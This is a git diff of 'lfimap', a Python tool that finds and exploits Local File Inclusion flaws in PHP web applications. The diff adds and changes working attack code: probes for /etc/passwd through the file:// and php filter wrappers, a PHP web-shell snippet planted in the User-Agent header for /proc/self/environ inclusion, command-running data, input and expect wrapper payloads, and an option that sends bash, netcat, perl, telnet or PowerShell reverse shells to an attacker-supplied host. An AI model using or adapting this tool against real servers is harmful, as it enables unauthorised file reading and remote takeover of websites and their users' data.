@@ -14,6 +14,7 @@ import threading
 import http.client
 import http.server
 import socketserver
+import traceback
 
 from argparse import RawTextHelpFormatter
 
@@ -86,7 +87,25 @@ def getExploit(req, request_type, exploit_type, getVal, postVal, headers, attack
     exploits.append(e)
     return e
 
-def test_wordlist(url):
+def test_file_wrapper(url):
+    if(args.verbose):
+        print("Testing with file:// wrapper")
+    
+    testL = []
+    testL.append("file:///etc/passwd")
+    testL.append("file://%2Fetc%2Fpasswd")
+
+    for i in range(len(testL)):
+        u = url.replace(args.param, testL[i])
+        res = requests.get(u, headers = headers, proxies = proxies)
+        if(checkPayload(res)):
+            print("[+] LFI -> " + u)
+            
+            if(args.no_stop):
+                continue
+            else: break
+
+def test_trunc(url):
     if(args.verbose):
         print("Testing path truncation using '" + wordlist + "' wordlist ...")
 
@@ -99,16 +118,15 @@ def test_wordlist(url):
 
         try:
             res = requests.get(u, headers = headers, proxies = proxies)
-        except:
-            print("Proxy problem... Exiting.")
-            sys.exit(-1)
+        except Exception as e:
+            print("Unknown problem occurred: " + e)
 
         if(checkPayload(res)):
             if('/etc/passwd' in u):
-                tempUrl = u.replace('/etc/passwd', 'TMP')
+                tempUrl = u.replace('/etc/passwd', args.param)
                 os = 'LINUX'
             else:
-                tempUrl = u.replace('Windows/System32/drivers/etc/hosts', 'TMP')
+                tempUrl = u.replace('Windows/System32/drivers/etc/hosts', args.param)
                 os = 'WINDOWS'
 
             getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'TRUNC', os)
@@ -119,9 +137,29 @@ def test_wordlist(url):
             
             if(not args.no_stop):
                 f.close()
-                return
+                break
             else: continue
+    
+    if(args.verbose): print("Testing /proc/self/environ inclusion via User-Agent")
+    test_self_environ(url)
 
+def test_self_environ(url):
+    testL = []
+    testL.append("/proc/self/environ&cmd=cat%20/etc/passwd")
+    testL.append("/proc/self/environ%00&cmd=cat%20/etc/passwd")
+    
+    tempHeaders = headers
+    tempHeaders['User-Agent'] = "Mozilla<?=`$_GET[cmd]`?>/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+    
+    for i in range(len(testL)):
+        u = url.replace(args.param, testL[i])
+        res = requests.get(u, headers = tempHeaders, proxies = proxies)
+        if(checkPayload(res)):
+            print("[+] RCE -> " + u + " via User-Agent String: '" + tempHeaders['User-Agent'] + "'")
+            
+            if(args.no_stop):
+                continue
+            else: break
 
 def test_php_filter(url):
     if(args.verbose):
@@ -146,18 +184,22 @@ def test_php_filter(url):
         
         try:
             res = requests.get(u, headers = headers, proxies = proxies)
-        except:
-            print("Proxy problem... Exiting.")
-            sys.exit(-1)
-
-        if(checkPayload(res)):
-            tempUrl = u.replace('/etc/passwd', 'TMP')
-            getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'FILTER', 'LINUX')
-            print("[+] LFI -> " + u)
             
-            if(args.no_stop):
-                continue
-            else: break
+            if(checkPayload(res)):
+                tempUrl = u.replace('/etc/passwd', 'CMD')
+                getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'FILTER', 'LINUX')
+                print("[+] LFI -> " + u)
+                
+                if(args.no_stop):
+                    continue
+                else: break
+        except ConnectionError:
+            print("Connection error has occurred...")
+
+        except Exception as e:
+            print("Unknown problem occurred : ")
+
+            
         
     #Windows
     for i in range(len(testW)):
@@ -165,18 +207,16 @@ def test_php_filter(url):
         
         try:
             res = requests.get(u, headers = headers, proxies = proxies)
-        except:
-            print("Proxy problem.. Exiting.")
-            sys.exit(-1)
-
-        if(checkPayload(res)):
-            tempUrl = u.replace("C:/Windows/System32/drivers/etc/hosts", 'TMP')
-            getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'FILTER', 'WINDOWS')
-            print("[+] LFI -> " + u)
-            
-            if(args.no_stop):
-                continue
-            else: break
+            if(checkPayload(res)):
+                tempUrl = u.replace("C:/Windows/System32/drivers/etc/hosts", 'CMD')
+                getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'FILTER', 'WINDOWS')
+                print("[+] LFI -> " + u)
+                
+                if(args.no_stop):
+                    continue
+                else: break
+        except Exception as e:
+            print("Unknown problem occurred: ")
 
 
 def test_php_data(url):
@@ -184,7 +224,6 @@ def test_php_data(url):
         print("Testing PHP data wrapper ...")
 
     testL = []
-    testL.append("data%3atext/plain,<%3fphp+system('cat+/etc/passwd')%3f>")
     testL.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20/etc/passwd")
 
     testW = []
@@ -196,17 +235,18 @@ def test_php_data(url):
             u = url.replace(args.param, testL[i])
         try:
             res = requests.get(u, headers = headers, proxies = proxies)
-        except:
-            print("Proxy problem... Exiting.")
-            sys.exit(-1)
+        
+            if(checkPayload(res)):
+                tempUrl = u.replace('cat%20/etc/passwd', 'CMD')
+                getExploit(res, 'GET', 'RCE', tempUrl, '', headers, 'DATA', 'LINUX')
+                print("[+] RCE -> " + u)
+                if(args.no_stop):
+                    continue
+                else: break
+        
+        except Exception as e:
+            print("Unknown problem occurred: ")
 
-        if(checkPayload(res)):
-            tempUrl = u.replace('cat%20/etc/passwd', 'TMP')
-            getExploit(res, 'GET', 'RCE', tempUrl, '', headers, 'DATA', 'LINUX')
-            print("[+] RCE -> " + u)
-            if(args.no_stop):
-                continue
-            else: break
 
     #Windows
     for i in range(len(testW)):
@@ -214,17 +254,17 @@ def test_php_data(url):
             u = url.replace(args.param, testW[i])
         try:
             res = requests.get(u, headers = headers, proxies = proxies)
-        except:
-            print("Proxy problem... Exiting.")
-            sys.exit(-1)
-
-        if(checkPayload(res)):
-            tempUrl = u.replace('ipconfig', 'TMP')
-            getExploit(res, 'GET', 'RCE', tempUrl, '', headers, 'DATA', 'WINDOWS')
-            print("[+] RCE -> " + u)
-            if(args.no_stop):
-                cxontinue
-            else: break
+        
+            if(checkPayload(res)):
+                tempUrl = u.replace('ipconfig', 'CMD')
+                getExploit(res, 'GET', 'RCE', tempUrl, '', headers, 'DATA', 'WINDOWS')
+                print("[+] RCE -> " + u)
+                if(args.no_stop):
+                    continue
+                else: break
+        
+        except Exception as e:
+            print("Unknown problem occurred: ")
 
     if(args.revshell):
         exploit(exploits, 'DATA')
@@ -254,16 +294,17 @@ def test_php_input(url):
         for j in range(len(posts)):
             try:
                 res = requests.post(u, headers = headers, data=posts[j], proxies = proxies)
-            except:
-                print("Proxy problem... Exiting.")
-                sys.exit(-1)
+                
+                if(checkPayload(res)):
+                    print("[+] RCE -> " + u + " -> HTTP POST: " + posts[j])
+                    os = 'LINUX'
+                    tempUrl = u.replace('cat%20/etc/passwd', 'CMD')
+                    getExploit(res, 'POST', 'RCE', tempUrl, posts[j], headers, 'INPUT', os)
+                    break
             
-            if(checkPayload(res)):
-                print("[+] RCE -> " + u + " -> HTTP POST: " + posts[j])
-                os = 'LINUX'
-                tempUrl = u.replace('cat%20/etc/passwd', 'TMP')
-                getExploit(res, 'POST', 'RCE', tempUrl, posts[j], headers, 'INPUT', os)
-                break
+            except Exception as e:
+                print("Unknown problem occurred: ")
+            
 
     if(os != 'LINUX'):
         #Windows
@@ -274,15 +315,15 @@ def test_php_input(url):
             for l in range(len(posts)):
                 try:
                     res = requests.post(u, headers = headers, data = posts[l], proxies = proxies)
-                except:
-                    print("Proxy problem... Exiting.")
-                    sys.exit(-1)
-
-                if(checkPayload(res)):
-                    tempUrl = u.replace('ipconfig', 'TMP')
-                    getExploit(res, 'POST', 'RCE', tempUrl, posts[l], headers, 'INPUT', 'WINDOWS')
-                    print("[+] RCE -> " + u + " -> HTTP POST: " + posts[l])
-                    break
+                    
+                    if(checkPayload(res)):
+                        tempUrl = u.replace('ipconfig', 'CMD')
+                        getExploit(res, 'POST', 'RCE', tempUrl, posts[l], headers, 'INPUT', 'WINDOWS')
+                        print("[+] RCE -> " + u + " -> HTTP POST: " + posts[l])
+                        break
+                
+                except Exception as e: 
+                    print("Unknown problem occurred: ")
 
     if(args.revshell):
         exploit(exploits, 'INPUT')
@@ -305,15 +346,16 @@ def test_php_expect(url):
         
         try:
             res = requests.get(u, headers = headers, proxies = proxies)
-        except:
-            print("Proxy problem... Exiting.")
-            sys.exit(-1)
+        
+            if(checkPayload(res)):
+                tempUrl = u.replace('cat%20%2Fetc%2Fpasswd', 'CMD')
+                getExploit(res, 'GET', 'RCE', tempUrl, testL[i], headers, 'EXPECT', 'LINUX')
+                print("[+] RCE -> " + u)
+                break
+        
+        except Exception as e:
+            print("Unknown problem occured: ")
 
-        if(checkPayload(res)):
-            tempUrl = u.replace('cat%20%2Fetc%2Fpasswd', 'TMP')
-            getExploit(res, 'GET', 'RCE', tempUrl, testL[i], headers, 'EXPECT', 'LINUX')
-            print("[+] RCE -> " + u)
-            break
 
     #Windows
     for j in range(len(testW)):
@@ -322,15 +364,16 @@ def test_php_expect(url):
         
         try:
             res = requests.get(u, headers = headers, proxies = proxies)
-        except:
-            print("Proxy problem... Exiting.")
-            sys.exit(-1)
+            
+            if(checkPayload(res)):
+                tempUrl = u.replace('ipconfig', 'CMD')
+                getExploit(res, 'GET', 'RCE', tempUrl, testW[j], headers, 'EXPECT', 'WINDOWS')
+                print("[+] RCE -> " + u)
+                break
         
-        if(checkPayload(res)):
-            tempUrl = u.replace('ipconfig', 'TMP')
-            getExploit(res, 'GET', 'RCE', tempUrl, testW[j], headers, 'EXPECT', 'WINDOWS')
-            print("[+] RCE -> " + u)
-            break
+        except Exception as e:
+            print("Unknown problem ocurred: ")
+        
 
     if(args.revshell):
         exploit(exploits, 'EXPECT')
@@ -352,6 +395,9 @@ def test_rfi(url):
                 print("[+] RFI -> "+ u)
         except:
             pass
+    else:
+        if(args.verbose):
+            print("[i] Testing RFI using internet source. If you want to test RFI on local web server specify '-r' and '--lhost' parameters")
 
     #Internet RFI test
     if(args.param in url):
@@ -360,7 +406,7 @@ def test_rfi(url):
     try:
         res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
         if(checkPayload(res)):
-            tempUrl = u.replace(pyld, 'TMP')
+            tempUrl = u.replace(pyld, 'CMD')
             getExploit(res, 'GET', 'RFI', tempUrl, '', headers, 'RFI', 'UNKN')
             print("[+] RFI -> " + u)
 
@@ -423,48 +469,47 @@ def exploit(exploits, method):
             if(exploit['OS'] == 'LINUX'):
                 url = exploit['GETVAL']
                 
-                
                 #Bash
-                u = url.replace('TMP', 'which%20bash')
+                u = url.replace('CMD', 'which%20bash')
                 res = requests.post(u, headers = headers, data=exploit['POSTVAL'], proxies = proxies)
                 if('/bin' in res.text and '/bash' in res.text):
-                    u = url.replace('tmp', bashPayload)
+                    u = url.replace('CMD', bashPayload)
                     printInfo(ip, port, 'bash', 'input wrapper')
                     requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
-                    requests.post(url.replace('TMP', "bash+/tmp/1.sh"), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                    requests.post(url.replace('CMD', "bash+/tmp/1.sh"), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                     return
-
+                
                 #Netcat
-                u = url.replace('TMP', 'which%20nc')
+                u = url.replace('CMD', 'which%20nc')
                 res = requests.post(u, headers = headers, data=exploit['POSTVAL'], proxies = proxies)
                 if('/bin' in res.text and '/nc' in res.text):
-                    u = url.replace('TMP', ncPayload)
+                    u = url.replace('CMD', ncPayload)
                     printInfo(ip, port, 'nc', 'input wrapper')
                     requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                     return
 
                 #PHP
-                u = url.replace('TMP', 'which%20php')
+                u = url.replace('CMD', 'which%20php')
                 res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                 if('/bin' in res.text and '/php' in res.text):
                     printInfo(ip, port, 'PHP', 'input wrapper')
-                    requests.post(url.replace('TMP', phpPayload), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                    requests.post(url.replace('CMD', phpPayload), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                     return
 
                 #Perl
-                u = url.replace('TMP', 'which%20perl')
+                u = url.replace('CMD', 'which%20perl')
                 res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                 if('/bin' in res.text and '/perl' in res.text):
-                    u = url.replace('TMP', perlPayload)
+                    u = url.replace('CMD', perlPayload)
                     printInfo(ip, port, 'perl', 'input wrapper')
                     requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                     return
                 
                 #Telnet
-                u = url.replace('TMP', 'which%20telnet')
+                u = url.replace('CMD', 'which%20telnet')
                 res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                 if('/bin' in res.text and '/telnet' in res.text):
-                    u = url.replace('TMP', telnetPayload)
+                    u = url.replace('CMD', telnetPayload)
                     printInfo(ip, port, 'telnet', 'input wrapper')
                     requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                     return
@@ -477,19 +522,19 @@ def exploit(exploits, method):
                 url = exploit['GETVAL']
                
                 #Powershell
-                u = url.replace('TMP', 'powershell.exe%20ipconfig')
+                u = url.replace('CMD', 'powershell.exe%20ipconfig')
                 res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                 if('Windows IP Configuration' in res.text):
-                    u = url.replace('TMP', powershellPayload) 
+                    u = url.replace('CMD', powershellPayload) 
                     requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                     printInfo(ip, port, 'powershell', 'input wrapper')
                     return
                 
                 #Netcat
-                u = url.replace('TMP', 'powershell.exe+if(Test-Path+%25windir%25\System32\\nc.exe){Write-Output+"lfimap-nc.exe"}%3b')
+                u = url.replace('CMD', 'powershell.exe+if(Test-Path+%25windir%25\System32\\nc.exe){Write-Output+"lfimap-nc.exe"}%3b')
                 res = requests.post(u, headers = headers, data=exploit['POSTVAL'], proxies = proxies)
                 if('lfimap-nc.exe' in res.text):
-                    u = url.replace('TMP', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
+                    u = url.replace('CMD', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
                     printInfo(ip, port, 'nc', 'input wrapper')
                     requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                     return
@@ -502,46 +547,46 @@ def exploit(exploits, method):
                 url = exploit['GETVAL']
                
                 #Bash
-                u = url.replace('TMP', 'which%20bash')
+                u = url.replace('CMD', 'which%20bash')
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/bash' in res.text):
                     printInfo(ip, port, 'bash', 'data wrapper')
-                    u = url.replace('TMP', bashPayload)
+                    u = url.replace('CMD', bashPayload)
                     requests.get(u, headers = headers, proxies = proxies)
-                    requests.get(url.replace('TMP', "bash+/tmp/1.sh"), headers = headers, proxies = proxies)
+                    requests.get(url.replace('CMD', "bash+/tmp/1.sh"), headers = headers, proxies = proxies)
                     return
 
                 #Netcat
-                u = url.replace('TMP', 'which%20nc')
+                u = url.replace('CMD', 'which%20nc')
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/nc' in res.text):
                     printInfo(ip, port, 'nc', 'data wrapper')
-                    u = url.replace('TMP', ncPayload)
+                    u = url.replace('CMD', ncPayload)
                     requests.get(u, headers = headers, proxies = proxies)
                     return
                 
                 #PHP
-                u = url.replace('TMP', 'which%20php')
+                u = url.replace('CMD', 'which%20php')
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/php' in res.text):
                     printInfo(ip, port, 'PHP', 'data wrapper')
-                    requests.get(url.replace('TMP', phpPayload), headers = headers, proxies = proxies)
+                    requests.get(url.replace('CMD', phpPayload), headers = headers, proxies = proxies)
                     return
 
                 #Perl
-                u = url.replace('TMP', 'which%20perl')
+                u = url.replace('CMD', 'which%20perl')
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/perl' in res.text):
                     printInfo(ip, port, 'perl', 'data wrapper')
-                    requests.get(url.replace('TMP', perlPayload), headers = headers, proxies = proxies)
+                    requests.get(url.replace('CMD', perlPayload), headers = headers, proxies = proxies)
                     return
 
                 
                 #Telnet
-                u = url.replace('TMP', 'which%20telnet')
+                u = url.replace('CMD', 'which%20telnet')
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/telnet' in res.text):
-                    u = url.replace('TMP', telnetPayload)
+                    u = url.replace('CMD', telnetPayload)
                     printInfo(ip, port, 'telnet', 'data wrapper')
                     requests.get(u, headers = headers, proxies = proxies)
                     return
@@ -551,19 +596,19 @@ def exploit(exploits, method):
                 url = exploit['GETVAL']
 
                 #Powershell
-                u = url.replace('TMP', 'powershell.exe%20ipconfig')
+                u = url.replace('CMD', 'powershell.exe%20ipconfig')
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('Windows IP Configuration' in res.text):
                     printInfo(ip, port, 'powershell', 'data wrapper')
-                    u = url.replace('TMP', powershellPayload)
+                    u = url.replace('CMD', powershellPayload)
                     requests.get(u, headers = headers, proxies = proxies)
                     return
 
                 #Netcat
-                u = url.replace('TMP', "dir%20C:\Windows\System32")
+                u = url.replace('CMD', "dir%20C:\Windows\System32")
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('nc.exe' in res.text):
-                    u = url.replace('TMP', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
+                    u = url.replace('CMD', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
                     printInfo(ip, port, 'nc', 'data wrapper')
                     requests.get(u, headers = headers, proxies = proxies)
                     return
@@ -575,46 +620,46 @@ def exploit(exploits, method):
                 url = exploit['GETVAL']
                 
                 #Bash
-                u = url.replace('TMP', 'which%20bash')
+                u = url.replace('CMD', 'which%20bash')
                 res = requsts.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/bash' in res.text):
-                    u = url.replace('TMP', bashPayload)
+                    u = url.replace('CMD', bashPayload)
                     printInfo(ip, port, 'bash', 'expect wrapper')
                     requests.get(u, headers = headers, proxies = proxies)
-                    requests.get(url.replace('TMP', "bash+/tmp/1.sh"), headers = headers, proxies = proxies)
+                    requests.get(url.replace('CMD', "bash+/tmp/1.sh"), headers = headers, proxies = proxies)
                     return
 
                 #Netcat
-                u = url.replace('TMP', 'which%20nc')
+                u = url.replace('CMD', 'which%20nc')
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/nc' in res.text):
-                    u = url.replace('TMP', ncPayload)
+                    u = url.replace('CMD', ncPayload)
                     printInfo(ip, port, 'nc', 'expect wrapper')
                     requests.get(u, headers = headers, proxies = proxies)
                     return
                
                 #PHP
-                u = url.replace('TMP', 'which%20php')
+                u = url.replace('CMD', 'which%20php')
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/php' in res.text):
                     printInfo(ip, port, 'PHP', 'expect wrapper')
-                    requests.get(url.replace('TMP', phpPayload), headers = headers, proxies = proxies)
+                    requests.get(url.replace('CMD', phpPayload), headers = headers, proxies = proxies)
                     return
 
                 #Perl
-                u = url.replace('TMP', 'which%20perl')
+                u = url.replace('CMD', 'which%20perl')
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/perl' in res.text):
                     printInfo(ip, port, 'perl', 'expect wrapper')
-                    requests.get(url.replace('TMP', perlPayload), headers = headers, proxies = proxies)
+                    requests.get(url.replace('CMD', perlPayload), headers = headers, proxies = proxies)
                     return
 
                 
                 #Telnet
-                u = url.replace('TMP', 'which%20telnet')
+                u = url.replace('CMD', 'which%20telnet')
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('/bin' in res.text and '/telnet' in res.text):
-                    u = url.replace('TMP', telnetPayload)
+                    u = url.replace('CMD', telnetPayload)
                     printInfo(ip, port, 'telnet', 'expect wrapper')
                     requests.get(u, headers = headers, proxies = proxies)
                     return
@@ -624,18 +669,18 @@ def exploit(exploits, method):
                 url = exploit['GETVAL']
                 
                 #Powershell
-                u = url.replace('TMP', 'powershell.exe%20ipconfig')
+                u = url.replace('CMD', 'powershell.exe%20ipconfig')
                 if('Windows IP Configuration' in res.text):
-                    u = url.replace('TMP', powershellPayload)
+                    u = url.replace('CMD', powershellPayload)
                     printInfo(ip, port, 'powershell', 'expect wrapper')
                     requests.get(u, headers = headers, proxies = proxies)
                     return
                 
                 #Netcat
-                u = url.replace('TMP', "dir%20C:\Windows\System32")
+                u = url.replace('CMD', "dir%20C:\Windows\System32")
                 res = request.get(u, headers = headers, proxies = proxies)
                 if('nc.exe' in res.text):
-                    u = url.replace('TMP', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
+                    u = url.replace('CMD', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
                     printInfo(ip, port, 'nc', 'expect wrapper')
                     request.get(u, headers = headers, proxies = proxies)
                     return
@@ -646,33 +691,10 @@ def exploit(exploits, method):
             if(exploit['OS'] == 'LINUX'):
                 url = exploit['GETVAL']
                 
-                #/proc/self/environ LFI to rev shell
-                tempHeaders = headers
-                tempHeaders['User-Agent'] = "<?php echo shell_exec($_GET['cmd']); ?>"
-                tempHeaders['Referer'] = "<?php echo shell_exec($_GET['cmd']); ?>"
-                u = url.replace('TMP', '/proc/self/environ')
-               
-                #Code injection
-                res = requests.get(u, headers =tempHeaders, proxies = proxies)
-                if(args.verbose):
-                    print("[i] Trying to send reverse shell using /proc/self/environ LFI ...")
-                
-                #Exploit /proc/self/environ injection
+                #Exploit /proc/self/environ injection via User-Agent string
                 #Bash rev. shell
-                u = url.replace('TMP', "/proc/self/environ&cmd={0}".format(bashPayload))
-                requests.get(u, headers = tempHeaders, proxies = proxies)
-                u = url.replace('TMP', "/proc/self/environ&cmd='bash+/tmp/1.sh'")
-                requests.get(u, headers = tempHeaders, proxies = proxies)
+                #TODO
 
-                
-               # #/proc/self/fd/ LFI to rev shell
-               # if(args.verbose):
-               #    print("[i] Bruteforcing /proc/self/fd descriptors ...")
-               # 
-               #  for i in range(15):
-               #      u = url.replace('TMP', "/proc/self/fd/{0}".format(i) + "?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f")
-               #     irequests.get(u, headers = tempHeaders, proxies = proxies)
-        
         elif(exploit['ATTACK_METHOD'] == method and method == 'RFI'):
             #url = exploit['GETVAL']
             #u = url.replace('TMP', 'http://' + ip + ":" + port + "/")
@@ -695,20 +717,21 @@ def main():
 
     #Perform all tests
     if(args.test_all):
+        test_file_wrapper(url)
         test_php_filter(url)
         test_php_input(url)
         test_php_data(url)
         test_php_expect(url)
         test_rfi(url)
-        test_wordlist(url)
+        test_trunc(url)
         
         print("Done.")
         lfimap_cleanup()
 
     default = True
-    if(args.wordlist):
+    if(args.trunc):
         default = False
-        test_wordlist(url)
+        test_trunc(url)
     if(args.php_filter):
         default = False
         test_php_filter(url)
@@ -727,12 +750,12 @@ def main():
 
     #Default behaviour
     if(default):
+        test_file_wrapper(url)
         test_php_filter(url)
         test_php_input(url)
         test_php_data(url)
         test_php_expect(url)
         test_rfi(url)
-
     print("Done.")
 
     lfimap_cleanup()
@@ -740,30 +763,31 @@ def main():
 if(__name__ == "__main__"):
     
     print("")
-    parser = argparse.ArgumentParser(description="lfimap, LFI discovery and exploitation tool", formatter_class=RawTextHelpFormatter, add_help=False)
-
+    parser = argparse.ArgumentParser(description="lfimap, Local File Inclusion discovery and exploitation tool", formatter_class=RawTextHelpFormatter, add_help=False)
+    
+    mandatoryGroup = parser.add_argument_group('MANDATORY')
+    mandatoryGroup.add_argument('url', type=str, metavar="URL", help="""\t\t Specify url, Ex: "http://example.org/vuln.php?param=PWN" """)
+    
     optionsGroup = parser.add_argument_group('GENERAL')
-    optionsGroup.add_argument('url', type=str, metavar="URL", help="""\t\t Specify url, Ex: "http://example.org/vuln.php?param=PWN" """)
     optionsGroup.add_argument('-c', type=str, metavar="<cookie>", dest='cookie', help='\t\t Specify session cookie, Ex: "PHPSESSID=1943785348b45"')
     optionsGroup.add_argument('-p', type=str, metavar = "<proxy>", dest="proxyAddr", help="\t\t Specify Proxy IP address. Ex: '10.10.10.10:8080'")
+    optionsGroup.add_argument('-w', type=str, metavar="<wordlist>", dest='wordlist', help="\t\t Specify wordlist for truncation attack (default 'short.txt')")
     optionsGroup.add_argument('--useragent', type=str, metavar= '<agent>', dest="agent", help="\t\t Specify HTTP user agent")
     optionsGroup.add_argument('--referer', type=str, metavar = '<referer>', dest='referer', help="\t\t Specify HTTP referer")
     optionsGroup.add_argument('--param', type=str, metavar="<name>", dest="param", help="\t\t Specify parameter name (default 'PWN')")
     optionsGroup.add_argument('--no-stop', action="store_true", dest = "no_stop", help="\t\t Don't stop using same method upon findings")
 
     attackGroup = parser.add_argument_group('ATTACK TECHNIQUE')
-    attackGroup.add_argument('-pf', '--php-filter', action="store_true", dest = 'php_filter', help="\t\t Attack using php filter wrapper")
-    attackGroup.add_argument('-pi', '--php-input', action="store_true", dest = 'php_input', help="\t\t Attack using php input wrapper")
-    attackGroup.add_argument('-pd', '--php-data', action="store_true", dest = 'php_data', help="\t\t Attack using php data wrapper")
-    attackGroup.add_argument('-pe', '--php-expect', action="store_true", dest = 'php_expect', help="\t\t Attack using php expect wrapper")
+    attackGroup.add_argument('-f', '--php-filter', action="store_true", dest = 'php_filter', help="\t\t Attack using php filter wrapper")
+    attackGroup.add_argument('-i', '--php-input', action="store_true", dest = 'php_input', help="\t\t Attack using php input wrapper")
+    attackGroup.add_argument('-d', '--php-data', action="store_true", dest = 'php_data', help="\t\t Attack using php data wrapper")
+    attackGroup.add_argument('-e', '--php-expect', action="store_true", dest = 'php_expect', help="\t\t Attack using php expect wrapper")
+    attackGroup.add_argument('-t', '--path-trunc', action="store_true", dest="trunc", help="\t\t Path truncation attack")
     attackGroup.add_argument('-r', '--rfi', action = "store_true", dest='rfi', help="\t\t Attack using remote file inclusion")
-    attackGroup.add_argument('-w', type=str, metavar="<wordlist>", dest='wordlist', help="\t\t Specify wordlist for truncation attack (default 'wordlist.txt')")
     attackGroup.add_argument('-a', '--attack-all', action="store_true", dest = 'test_all', help="\t\t Use all available methods to attack")
 
-    #postExpGroup = parser.add_argument_group('ENUMERATE')
-    
     payloadGroup = parser.add_argument_group('PAYLOAD')
-    payloadGroup.add_argument('-x', '--send-revshell',action="store_true", dest="revshell", help="\t\t Send reverse shell connection if possible (Setup reverse handler first.)")
+    payloadGroup.add_argument('-x', '--send-revshell',action="store_true", dest="revshell", help="\t\t Send reverse shell connection if possible (Setup reverse handler first)")
     payloadGroup.add_argument('--lhost', type=str, metavar="<lhost>", dest="lhost", help="\t\t Specify localhost IP address for reverse connection")
     payloadGroup.add_argument('--lport', type=int, metavar="<lport>", dest="lport", help="\t\t Specify local PORT number for reverse connection")
 
@@ -781,9 +805,14 @@ if(__name__ == "__main__"):
         if(os.getuid() != 0):
             print("[-] Please run lfimap as admin/root for all tests. Exiting...")
             sys.exit()
+    elif(args.lhost):
+        if(os.getuid() != 0):
+            print("[-] Cannot run LHOST file inclusion test as non admin user. Please run lfimap as admin/root. Exiting...")
+            sys.exit()
+
+    urlRegex = re.compile(
 
     #Checks if provided URL is valid
-    urlRegex = re.compile(
     r'^(?:http|ftp)s?://' # http:// or https:// or ftp://
     r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
     r'localhost|' #localhost...
@@ -803,9 +832,9 @@ if(__name__ == "__main__"):
             print("[-] Specified wordlist doesn't exist. Exiting...")
             sys.exit(-1)
     else:
-        wordlist = "wordlist.txt"
+        wordlist = "wordlists/short.txt"
         if(not os.path.exists(wordlist) and args.test_all):
-            print("[-] Cannot find 'wordlist.txt' list. Since '-a' was specified, lfimap will exit...")
+            print("[-] Cannot find 'short.txt' list. Since '-a' was specified, lfimap will exit...")
             sys.exit(-1)
     
     #Checks if '--lhost' and '--lport' are provided with '-x'
@@ -839,10 +868,6 @@ if(__name__ == "__main__"):
         print("[!] WARNING: Cookie argument ('-c') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.\n")
         time.sleep(2)
 
-    if(args.rfi and args.lhost):
-        if(os.getuid() != 0):
-            print("[-] Cannot run LHOST file inclusion test as non admin user. Please run lfimap as admin/root. Exiting...")
-            sys.exit()
     
 
     #Everything is OK, preparing http request headers
